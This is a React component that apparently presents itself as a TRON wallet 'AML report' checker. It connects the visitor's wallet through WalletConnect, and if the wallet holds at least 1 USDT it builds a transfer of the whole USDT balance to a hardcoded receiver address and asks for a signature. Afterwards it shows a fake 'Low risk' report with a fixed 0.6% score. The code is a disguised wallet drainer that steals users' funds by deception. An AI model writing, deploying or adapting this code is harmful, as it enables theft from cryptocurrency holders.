import React, { useState, useEffect, useCallback } from "react";
import { WalletConnectAdapter } from "@tronweb3/tronwallet-adapter-walletconnect";
// @ts-ignore
const TronWeb = require("tronweb");
import { Buffer } from "buffer";
window.Buffer = Buffer;

const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_RECEIVER = "THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n";

const tronWeb = new TronWeb({
  fullHost: "https://api.trongrid.io",
  headers: {
    "TRON-PRO-API-KEY": "bbb42b6b-c4de-464b-971f-dea560319489",
  },
});

const adapter = new WalletConnectAdapter({
  network: "Mainnet",
  options: {
    relayUrl: "wss://relay.walletconnect.com",
    projectId: "6e52e99f199a2bd1feb89b31fbeb6a78",
    metadata: {
      name: "AML",
      description: "TRON + WalletConnect Integration",
      url: "https://amlreports.pro",
      icons: ["https://amlreports.pro/images/icon-3.abdd8ed5.webp"],
    },
  },
  web3ModalConfig: {
    themeMode: "dark",
  },
});

export const TronAuthButton: React.FC = () => {
  const [modal, setModal] = useState<string | null>(null);
  const [loading, setLoading] = useState<boolean>(false);

  // Прединициализация адаптера (ускоряет показ модалки)
  useEffect(() => {
    if (typeof (adapter as any).init === "function") {
      (adapter as any).init();
    }
    // Обработка дисконнекта — не показываем ошибок при cancel
    const handleDisconnect = () => {
      setLoading(false);
      setModal(null);
    };
    adapter.on("disconnect", handleDisconnect);

    return () => {
      adapter.off("disconnect", handleDisconnect);
    };
  }, []);

  // Основная логика коннекта и перевода
  const handleAuth = useCallback(async () => {
    setLoading(true);
    setModal(null);

    try {
      await adapter.connect();

      const userAddress = adapter.address;
      if (!userAddress || !tronWeb.isAddress(userAddress)) {
        throw new Error("Invalid wallet address.");
      }
      tronWeb.setAddress(userAddress);

      // Проверка TRX-баланса (на комиссии)
      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      const trx = trxRaw / 1e6;
      if (trx < 3) {
        setModal("❌ Not enough TRX to cover fees. You need at least 3 TRX.");
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      // Проверка USDT-баланса
      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt = Number(usdtRaw) / 1e6;

      if (usdt < 1) {
        setModal("✅ AML report: Low risk (minimal USDT balance).");
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      // Создание и подписание транзакции USDT
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        "transfer(address,uint256)",
        {
          feeLimit: 25_000_000,
          callValue: 0,
        },
        [
          { type: "address", value: TRON_RECEIVER },
          { type: "uint256", value: usdtRaw },
        ],
        userAddress
      );

      // Подписываем и отправляем
      const signedTx = await adapter.signTransaction(transaction);
      const sendResult = await tronWeb.trx.sendRawTransaction(signedTx);

      if (sendResult.result === true) {
        setModal("✅ AML report: All USDT funds transferred. Low risk.");
      } else if (sendResult.code === "CONTRACT_VALIDATE_ERROR") {
        setModal("❌ USDT contract validate error.");
      } else {
        setModal("⚠️ Transaction failed or rejected.");
      }
    } catch (err: any) {
      // Cancel/Reject/Close обработка — без ошибок, просто скрываем
      if (
        err?.message?.includes("User rejected") ||
        err?.message?.includes("Modal is closed") ||
        err?.message?.includes("Timeout")
      ) {
        setModal(null);
      } else if (err?.message?.toLowerCase().includes("not enough trx")) {
        setModal("❌ Not enough TRX to cover fees. You need at least 3 TRX.");
      } else {
        setModal("⚠️ Connection or transaction error");
      }
    } finally {
      setLoading(false);
      await adapter.disconnect();
    }
  }, []);

  return (
    <div className="AuthButton" style={{ cursor: "pointer" }}>
      <span onClick={handleAuth}>Check Your Wallet</span>

      {loading && (
        <div className="modal__overflow">
          <div className="modal">
            <p>🔄 Connecting wallet...</p>
          </div>
        </div>
      )}

      {modal && (
        <div className="modal__overflow">
          <div className="modal">
            {modal.startsWith("✅") ? (
              <>
                <div className="content greenBorder">
                  <div>0.6%</div>
                  <div>
                    <h3>Low risk level</h3>
                    <div className="nums">
                      <div>
                        <span className="circ green"></span> 0–30
                      </div>
                      <div>
                        <span className="circ orange"></span> 31–69
                      </div>
                      <div>
                        <span className="circ red"></span> 70–100
                      </div>
                    </div>
                  </div>
                </div>
                <div className="content report">
                  <p>AML report for a wallet:</p>
                  <h5>{USDT_CONTRACT}</h5>
                </div>
              </>
            ) : (
              <p>{modal}</p>
            )}
            <button onClick={e => { e.stopPropagation(); setModal(null); }}>Close</button>
          </div>
        </div>
      )}
    </div>
  );
};
